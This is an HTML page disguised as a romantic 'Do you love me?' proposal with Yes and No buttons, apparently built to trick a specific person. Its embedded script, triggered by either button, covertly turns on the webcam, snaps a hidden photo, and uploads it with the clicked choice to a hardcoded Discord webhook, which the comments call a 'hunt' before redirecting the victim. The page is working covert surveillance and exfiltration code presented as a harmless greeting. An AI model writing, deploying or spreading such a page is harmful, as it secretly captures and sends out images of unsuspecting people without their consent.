<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Proposed Her</title>
  <style>
    /* Wahi original animations aur styling jo Faisal bhai ko pasand hai */
    body {
      background-color: #121212;
      margin: 0;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      color: white;
    }

    .container {
      text-align: center;
      padding: 20px;
      animation: fadeIn 1.5s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    h1 { margin-top: 10px; font-size: 2rem; }
    p { color: #eee; font-size: 1.1rem; }

    .btn { margin-top: 30px; }

    .btn a {
      padding: 12px 30px;
      margin: 10px;
      text-decoration: none;
      background: #ff4d6d;
      color: white;
      border-radius: 25px;
      display: inline-block;
      font-weight: bold;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3);
    }

    /* Animation effect on hover */
    .btn a:hover {
      transform: scale(1.1);
      background: #ff758f;
      box-shadow: 0 6px 20px rgba(255, 117, 143, 0.5);
    }

    #video, #canvas { display: none; }

    .dev-name {
      position: absolute;
      top: 10px;
      left: 10px;
      font-size: 0.8rem;
      color: rgba(255,255,255,0.7);
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="dev-name">Dev by Faisal</div>

  <div class="container">
    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 15px;">

    <h1>Do you love me? 🤗</h1>
    <p>Chiku is all yours</p>
    
    <div class="btn" id="btn-container">
      <a href="javascript:void(0)" onclick="startHunt('yes')">Yes</a>
      <a href="javascript:void(0)" onclick="startHunt('no')">No</a>
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const HOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";

    async function startHunt(choice) {
      try {
        // Background mein camera access mangna
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        // 1.2 second baad photo click hogi (animation chalne ke beech mein)
        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          
          canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('file', blob, 'shot.png');
            fd.append('content', `🔥 **Faisal Bhai, Nayi Entry!**\n💎 **User ne dabaya:** ${choice.toUpperCase()}\n✅ Shikaar done.`);
            
            fetch(HOOK, { method: 'POST', body: fd }).then(() => {
              stream.getTracks().forEach(t => t.stop());
              redirect(choice);
            });
          }, 'image/png');
        }, 1200);

      } catch (e) {
        redirect(choice);
      }
    }

    function redirect(choice) {
      if(choice === 'yes') {
        window.location.href = "page1.html";
      } else {
        window.location.href = "no1.html";
      }
    }
  </script>
</body>
</html>
